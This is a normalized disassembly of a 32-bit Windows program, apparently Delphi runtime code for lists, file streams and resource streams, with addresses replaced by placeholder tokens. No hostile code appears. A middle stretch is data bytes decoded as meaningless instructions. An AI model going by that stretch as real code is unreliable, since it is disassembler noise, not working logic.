call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_41acb0
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_40408c
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_4028c8
sub_41adfc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_419e54
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419e54
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_40408c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41ae58
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419e54
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41ae98
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41abb0
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41ae98
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41af48
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_41afa4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_41ae98
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41aff8
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_41b02c
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_41b090
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_41b0e4
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4031f8
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac8
call sub_403a74
mov esp ebp
pop ebp
retn
sub_41b130
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_4031f0
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_41b0e4
pop ecx
mov eax [ ebx ]
call sub_403234
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_41b0e4
pop ecx
sub_41b1b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_41b224
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
sub_41b25c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
sub_41b294
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_41b018
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026cc
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_41b370
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b377
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4026ec
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_41b224
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_41b25c
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_41b388
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ba70
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41b3d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_41daa4
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b3df
mov eax [ ebp - 0x8 ]
call sub_4032a8
retn
sub_41b3f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ba70
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b440
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41f238
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b447
mov eax [ ebp - 0x4 ]
call sub_4032a8
retn
sub_41b44c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403278
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_41b4a8
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_4087c0
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41b4e8
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40d030
pop ebx
pop ebp
retn 0x8
sub_41b510
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_41b554
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_41b554
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_41b67d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_40360c
movzx edx di
mov eax esi
call sub_4086e4
mov ecx eax
xor edx edx
mov eax ebx
call sub_41b44c
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_408760
mov ecx eax
xor edx edx
mov eax ebx
call sub_41b44c
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b684
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_40405c
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_408990
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40b1c8
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac8
call sub_403a74
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_408990
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40b1c8
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac8
call sub_403a74
jmp r-xdata
sub_41b684
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_41b6a8
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403298
test bl bl
jle r-xdata
call sub_4087f8
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_41b6e4
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4028c8
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_41b71c
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_41b740
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax esi
call sub_41b76c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403298
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_41b784
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_41b018
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_41b224
sub_41b7bc
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_41b6dc
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_41b7e4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_41b7bc
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_41b810
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_406cdc
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_406cc0
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_406cb0
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
test ecx ecx
jne r-xdata
sub_41b89c
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4028c8
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_41b7bc
sub_41b8ec
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403278
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_4044f8
mov ecx eax
mov edx esi
mov eax edi
call sub_41b9b4
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_41b944
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41b9a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba0c
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b9ae
lea eax [ ebp - 0xc ]
call sub_404038
retn
sub_41b9b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_41b944
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_41b6dc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_41b944
pop ecx
sub_41ba20
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_406cac
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403298
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_41ba70
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_4026cc
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_41bab8
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_4026ec
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_41bae8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0xbb
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x45 ] cl
inc ecx
add [ eax ] bl
add [ eax ] al
add [ eax - 0xfffbff0 ] dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x5c004032 ] bl
mov esp 0xe0041
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc al 0x0
add [ eax ] al
or dl [ eax + edx * 2 + 0x72 ]
outsd
jo r-xdata
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x6c004032 ] bl
mov esp 0x540e0041
push eax
jb r-xdata
imul edi [ eax + 0x75 ] r-xdata
test al 0xbb
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 4 + 0x180041 ] ch
add [ eax ] al
in al 0xba
inc ecx
add al dh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
fsubp st3
add [ ebx - 0x76 ] eax
adc eax [ edx + edx * 8 - 0x157ffa8c ]
r-xdata
jo r-xdata
inc ebx
cmp [ ebx ] 0x0
je r-xdata
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
outsb
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_404128
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_404598
mov al 0x1
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
inc esi
imul edi [ eax + 0x75 ] 0x8b559070
in al dx
push ebx
push esi
test dl dl
je r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_40408c
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_40408c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41bbbc
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_40408c
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_40408c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_41bc14
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_404128
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_404598
mov al 0x1
inc ebx
sub_41bc6c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41bce3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_405934
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_4157d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bcea
lea eax [ ebp - 0x4 ]
call sub_405934
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_414b1c
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_405934
mov ecx eax
mov eax esi
pop edx
call sub_40d524
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_405934
sub_41bcf0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41bd96
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bd9d
lea eax [ ebp - 0x8 ]
call sub_404038
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_404128
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_421450
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_408048
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_41bdb8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
